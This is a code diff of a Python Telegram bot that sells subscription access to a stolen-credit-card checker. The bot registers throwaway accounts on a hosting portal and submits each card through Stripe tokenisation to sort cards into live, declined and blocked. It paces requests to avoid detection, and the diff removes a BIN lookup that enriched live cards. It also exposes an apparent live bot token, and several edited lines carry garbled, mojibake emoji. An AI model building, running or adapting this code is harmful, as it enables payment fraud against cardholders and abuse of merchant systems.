@@ -16,36 +16,6 @@ def generate_email(domain="necub.com"):
     prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
     return f"{prefix}@{domain}"
 
-# ==============================
-# BIN LOOKUP FUNCTION
-def get_card_info(card_number):
-    """Get card BIN information"""
-    try:
-        bin_number = str(card_number)[:6]
-        url = f"https://lookup.binlist.net/{bin_number}"
-        
-        headers = {
-            "Accept-Version": "3"
-        }
-        
-        response = requests.get(url, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            data = response.json()
-            return {
-                "BIN": bin_number,
-                "Scheme": data.get("scheme", "Unknown"),
-                "Type": data.get("type", "Unknown"),
-                "Brand": data.get("brand", "Unknown"),
-                "Country": data.get("country", {}).get("name", "Unknown"),
-                "Bank": data.get("bank", {}).get("name", "Unknown")
-            }
-        else:
-            return None
-    except Exception as e:
-        print(f"BIN lookup error: {e}")
-        return None
-
 # BOT TOKEN
 TOKEN = "7707283677:AAF0rE6MKt-HBq8_MfyQ00V28y_l3Tnu-HM"
 bot = telebot.TeleBot(TOKEN)
@@ -58,7 +28,7 @@ ADMIN_IDS = [5895491379]  # Your ID
 
 # CONTACT INFO
 CONTACT_INFO = {
-    'name': 'Mahmoud Saad 🥷🏻',
+    'name': 'Mahmoud Saad ðŸ¥·ðŸ»',
     'username': '@FastSpeedtest',
     'id': 5895491379
 }
@@ -462,43 +432,30 @@ def check_subscription(user_id):
         return True
     return False
 
-# ==============================
-# DASHBOARD FUNCTIONS
+# ================== DASHBOARD ==================
 def generate_dashboard(chat_id):
     s = stats.get(chat_id)
     if not s:
         return "⚠️ No data available."
 
     msg = "📊 **CARD CHECKER RESULTS**\n\n"
-    if s.get('visa_checked'):
+    if s['visa_checked']:
         msg += f"💳 **Current:** `{s['visa_checked']}`\n"
-        msg += f"📌 **Status:** {s.get('response', 'Processing...')}\n\n"
+        msg += f"📌 **Status:** {s['response']}\n\n"
     else:
-        msg += f"📌 **Status:** {s.get('response', 'Starting...')}\n\n"
+        msg += f"📌 **Status:** {s['response']}\n\n"
 
     msg += "━━━━━━━━━━━━━━━━━━━━\n\n"
     
-    if s.get("lives"):
-        msg += "💳 **Live Cards:**\n"
+    if s["lives"]:
+        msg += "✅ **Live Cards:**\n"
         for card in s["lives"]:
-            try:
-                card_number = card.split("|")[0]
-                card_info = get_card_info(card_number)
-                
-                if card_info:
-                    msg += f"`{card}`\n"
-                    msg += f"🏦 **Bank:** {card_info['Bank']}\n"
-                    msg += f"🌍 **Country:** {card_info['Country']}\n"
-                    msg += f"💎 **Type:** {card_info['Scheme']} {card_info['Type']}\n"
-                    msg += f"🏷️ **Brand:** {card_info['Brand']}\n\n"
-                else:
-                    msg += f"`{card}`\n\n"
-            except Exception as e:
-                print(f"Card info error: {e}")
-                msg += f"`{card}`\n\n"
-    
+            msg += f"`{card}`\n"
+            
     return msg
 
+
+# ================== BUTTONS ==================
 def generate_buttons(chat_id):
     s = stats.get(chat_id, {"approved":0,"declined":0,"cvv":0,"ccn":0,"total":0})
     markup = InlineKeyboardMarkup(row_width=2)
@@ -508,43 +465,47 @@ def generate_buttons(chat_id):
     )
     markup.add(
         InlineKeyboardButton(f"⚠️ CVV Error: {s['cvv']}", callback_data="show_cvv"),
-        InlineKeyboardButton(f"⛔ Blocked: {s['ccn']}", callback_data="show_ccn"),
+        InlineKeyboardButton(f"🚫 Blocked: {s['ccn']}", callback_data="show_ccn"),
     )
     markup.add(
         InlineKeyboardButton(f"📊 Total: {s['total']}", callback_data="show_total")
     )
     markup.add(
-        InlineKeyboardButton("ℹ️ Stop Check", callback_data="stop_check")
+        InlineKeyboardButton("⏹ Stop Check", callback_data="stop_check")
     )
     return markup
 
+
+# ================== ADMIN PANEL ==================
 def generate_admin_panel():
     """Generate admin panel buttons"""
     markup = InlineKeyboardMarkup(row_width=2)
     
     sub_status = "ON" if is_subscription_required() else "OFF"
     markup.add(
-        InlineKeyboardButton(f"🔄 Subscription: {sub_status}", callback_data="toggle_subscription")
+        InlineKeyboardButton(f"💳 Subscription: {sub_status}", callback_data="toggle_subscription")
     )
     markup.add(
-        InlineKeyboardButton("👑 Manage Admins", callback_data="manage_admins"),
-        InlineKeyboardButton("💎 Add Subscription", callback_data="add_subscription")
+        InlineKeyboardButton("👤 Manage Admins", callback_data="manage_admins"),
+        InlineKeyboardButton("🎟 Add Subscription", callback_data="add_subscription")
     )
     markup.add(
         InlineKeyboardButton("📊 Statistics", callback_data="show_stats"),
-        InlineKeyboardButton("👥 All Users", callback_data="show_users")
+        InlineKeyboardButton("🔥 All Users", callback_data="show_users")
     )
     return markup
 
+
+# ================== ADMIN LIST ==================
 def generate_admin_list():
     """Generate admin management panel"""
     markup = InlineKeyboardMarkup(row_width=1)
     
     admins = get_all_admins()
     if admins:
-        markup.add(InlineKeyboardButton("📝 Current Admins:", callback_data="none"))
+        markup.add(InlineKeyboardButton("👑 Current Admins:", callback_data="none"))
         for admin_id, username in admins:
-            admin_text = f"👑 {username or 'No username'} ({admin_id})"
+            admin_text = f"👤 {username or 'No username'} ({admin_id})"
             if admin_id in ADMIN_IDS:
                 admin_text += " [MAIN]"
             markup.add(InlineKeyboardButton(admin_text, callback_data=f"admin_info_{admin_id}"))
@@ -556,23 +517,25 @@ def generate_admin_list():
     markup.add(InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
     return markup
 
+
+# ================== SUBSCRIPTION PANEL ==================
 def generate_subscription_panel():
     """Generate subscription management panel"""
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton("⏰ 1 Hour", callback_data="sub_1h"),
-        InlineKeyboardButton("⏰ 3 Hours", callback_data="sub_3h")
+        InlineKeyboardButton("⏱ 1 Hour", callback_data="sub_1h"),
+        InlineKeyboardButton("⏱ 3 Hours", callback_data="sub_3h")
     )
     markup.add(
-        InlineKeyboardButton("⏰ 6 Hours", callback_data="sub_6h"),
-        InlineKeyboardButton("⏰ 12 Hours", callback_data="sub_12h")
+        InlineKeyboardButton("⏱ 6 Hours", callback_data="sub_6h"),
+        InlineKeyboardButton("⏱ 12 Hours", callback_data="sub_12h")
     )
     markup.add(
-        InlineKeyboardButton("📅 1 Day", callback_data="sub_1d"),
-        InlineKeyboardButton("📅 3 Days", callback_data="sub_3d")
+        InlineKeyboardButton("🕐 1 Day", callback_data="sub_1d"),
+        InlineKeyboardButton("🕒 3 Days", callback_data="sub_3d")
     )
     markup.add(
-        InlineKeyboardButton("📅 7 Days", callback_data="sub_7d"),
+        InlineKeyboardButton("🗓 7 Days", callback_data="sub_7d"),
         InlineKeyboardButton("📅 30 Days", callback_data="sub_30d")
     )
     markup.add(
@@ -597,7 +560,7 @@ def run_check(chat_id):
     
     # Register new account
     if not register_account(email):
-        s["response"] = "❌ Account registration failed"
+        s["response"] = "âŒ Account registration failed"
         stats[chat_id] = s
         return
 
@@ -606,7 +569,7 @@ def run_check(chat_id):
     login_response = session.post("https://portal.budgetvm.com/auth/login", data=login_data)
     
     if login_response.status_code != 200:
-        s["response"] = "❌ Login failed"
+        s["response"] = "âŒ Login failed"
         stats[chat_id] = s
         return
 
@@ -621,16 +584,16 @@ def run_check(chat_id):
     session.post("https://portal.budgetvm.com/auth/googleAsk", data=google_data)
 
     if "ePortalv1" not in session.cookies.get_dict():
-        s["response"] = "❌ Login/GoogleAsk failed"
+        s["response"] = "âŒ Login/GoogleAsk failed"
         stats[chat_id] = s
         return
 
-    print(f"✅ Successfully logged in with: {email}")
+    print(f"âœ… Successfully logged in with: {email}")
     
     # Check cards with delay
     for i, card in enumerate(cards):
         if stop_flag.get(chat_id):
-            s["response"] = "ℹ️ Check stopped"
+            s["response"] = "â¹ï¸ Check stopped"
             stats[chat_id] = s
             break
 
@@ -641,20 +604,22 @@ def run_check(chat_id):
             card_number, exp_month, exp_year, cvc = card.split("|")
         except:
             s["cvv"] += 1
-            s["response"] = "❌ Invalid card format"
+            s["response"] = "âŒ Invalid card format"
             continue
 
         # Add 15 second delay between card requests (except for first card)
+# Add 15 second delay between card requests (except for first card)
         if i > 0:
-            print(f"⏳ Waiting 15 seconds before next card...")
+            print("⏳ Waiting 15 seconds before next card...")
             for countdown in range(15, 0, -1):
                 if stop_flag.get(chat_id):
-                    s["response"] = "ℹ️ Check stopped"
+                    s["response"] = "⏹ Check stopped"
                     stats[chat_id] = s
                     return
                 time.sleep(1)
 
-        print(f"🔥 Checking card {i+1}/{len(cards)}: {card_number[:4]}****{card_number[-4:]}")
+        print(f"💳 Checking card {i+1}/{len(cards)}: {card_number[:4]}****{card_number[-4:]}")
+
 
         # Stripe Token
         muid, sid, guid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
@@ -669,7 +634,7 @@ def run_check(chat_id):
 
         if "id" not in resp_json:
             s["cvv"] += 1
-            s["response"] = "❌ Token creation failed"
+            s["response"] = "âŒ Token creation failed"
         else:
             token_id = resp_json["id"]
             card_response = session.post(
@@ -685,20 +650,21 @@ def run_check(chat_id):
                 s["response"] = "❓ Unknown response"
                 continue
 
-            result = str(resp_json.get("result",""))
+            result = str(resp_json.get("result", ""))
             if resp_json.get("success") is True:
                 s["approved"] += 1
                 s["response"] = f"✅ {result}"
                 s["lives"].append(card)
             elif "does not support" in result.lower() or "blocked" in result.lower():
                 s["ccn"] += 1
-                s["response"] = f"⛔ {result}"
+                s["response"] = f"🚫 {result}"
             elif "declined" in result.lower():
                 s["declined"] += 1
                 s["response"] = f"❌ {result}"
             else:
                 s["unknown"] += 1
                 s["response"] = f"❓ {result}"
+
 
         stats[chat_id] = s
 
@@ -727,59 +693,66 @@ def send_welcome(message):
     
     if not check_subscription(user_id):
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("💬 Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
+        markup.add(InlineKeyboardButton("ðŸ'¬ Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
         
         bot.send_message(
             message.chat.id, 
             f"🚫 **Access Denied**\n\n"
             f"❌ You don't have an active subscription!\n\n"
-            f"👤 **Your ID:** `{user_id}`\n"
-            f"👑 **Contact Admin:** {CONTACT_INFO['name']}\n"
-            f"📱 **Username:** {CONTACT_INFO['username']}\n"
-            f"🆔 **Admin ID:** `{CONTACT_INFO['id']}`\n\n"
-            f"📞 Click the button below to contact admin for subscription!",
+            f"🆔 **Your ID:** `{user_id}`\n"
+            f"👤 **Contact Admin:** {CONTACT_INFO['name']}\n"
+            f"📱 **Username:** @{CONTACT_INFO['username']}\n"
+            f"🆘 **Admin ID:** `{CONTACT_INFO['id']}`\n\n"
+            f"👉 Click the button below to contact admin for subscription!",
             parse_mode="Markdown",
             reply_markup=markup
         )
         return
+
     
     if is_admin(user_id):
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel"))
+        markup.add(InlineKeyboardButton("👤 Admin Panel", callback_data="admin_panel"))
         bot.send_message(
             message.chat.id, 
-            "👋 **Welcome Admin!**\n\n"
+            "🙌 **Welcome Admin!**\n\n"
             "🚀 **Card Checker Bot**\n"
             "💳 Use /check to start checking cards\n"
-            "👑 Use Admin Panel for management\n\n"
-            "📝 **Commands:**\n"
+            "👤 Use Admin Panel for management\n\n"
+            "📌 **Commands:**\n"
             "• `/check` - Start card checking\n"
-            "• `/admin` - Admin panel",
+            "• `/admin` - Open admin panel",
             parse_mode="Markdown",
             reply_markup=markup
         )
+
     else:
         sub_end = get_user_subscription(user_id)
-        sub_text = f"📅 **Expires:** {sub_end.strftime('%Y-%m-%d %H:%M UTC')}" if sub_end else "♾️ **Unlimited**"
+        sub_text = (
+            f"📅 **Expires:** {sub_end.strftime('%Y-%m-%d %H:%M UTC')}"
+            if sub_end else
+            "♾️ **Unlimited**"
+        )
         
         bot.send_message(
             message.chat.id, 
-            f"👋 **Welcome!**\n\n"
+            f"🙌 **Welcome!**\n\n"
             f"🚀 **Card Checker Bot**\n"
             f"✅ **Subscription Status:** Active\n"
             f"{sub_text}\n\n"
-            f"📝 **Commands:**\n"
+            f"📌 **Commands:**\n"
             f"• `/check` - Start card checking\n\n"
             f"💳 Ready to check your cards!",
             parse_mode="Markdown"
         )
+
 
 @bot.message_handler(commands=['admin'])
 def admin_panel(message):
     user_id = message.from_user.id
     
     if not is_admin(user_id):
-        bot.send_message(message.chat.id, "🚫 Access denied! Admin only.")
+        bot.send_message(message.chat.id, "ðŸš« Access denied! Admin only.")
         return
     
     stats = get_user_stats()
@@ -787,16 +760,17 @@ def admin_panel(message):
     
     bot.send_message(
         message.chat.id,
-        f"👑 **Admin Panel**\n\n"
+        f"👤 **Admin Panel**\n\n"
         f"📊 **System Status:**\n"
         f"• Subscription System: **{sub_status}**\n"
         f"• Total Users: **{stats['total']}**\n"
         f"• Active Subscriptions: **{stats['active_subs']}**\n"
         f"• Expired Subscriptions: **{stats['expired_subs']}**\n\n"
-        f"🔧 **Management Options:**",
+        f"⚙️ **Management Options:**",
         parse_mode="Markdown",
         reply_markup=generate_admin_panel()
     )
+
 
 @bot.message_handler(commands=['check'])
 def ask_for_cards(message):
@@ -804,27 +778,28 @@ def ask_for_cards(message):
     
     if not check_subscription(user_id):
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("💬 Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
+        markup.add(InlineKeyboardButton("ðŸ'¬ Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
         
         bot.send_message(
             message.chat.id, 
-            f"🚫 **Subscription Required**\n\n"
+            f"💳 **Subscription Required**\n\n"
             f"❌ You need an active subscription to use this service!\n\n"
-            f"👤 **Your ID:** `{user_id}`\n"
-            f"📞 Contact admin for subscription:",
+            f"🆔 **Your ID:** `{user_id}`\n"
+            f"👉 Contact admin for subscription:",
             parse_mode="Markdown",
             reply_markup=markup
         )
         return
+
     
     bot.send_message(
         message.chat.id, 
         "💳 **Send your cards now!**\n\n"
         "📝 **Format:** `4111111111111111|12|2025|123`\n\n"
-        "🔄 **Options:**\n"
+        "⚙️ **Options:**\n"
         "• Send as text (one per line)\n"
         "• Upload .txt file\n\n"
-        "⚡ Ready to check your cards!",
+        "✅ Ready to check your cards!",
         parse_mode="Markdown"
     )
 
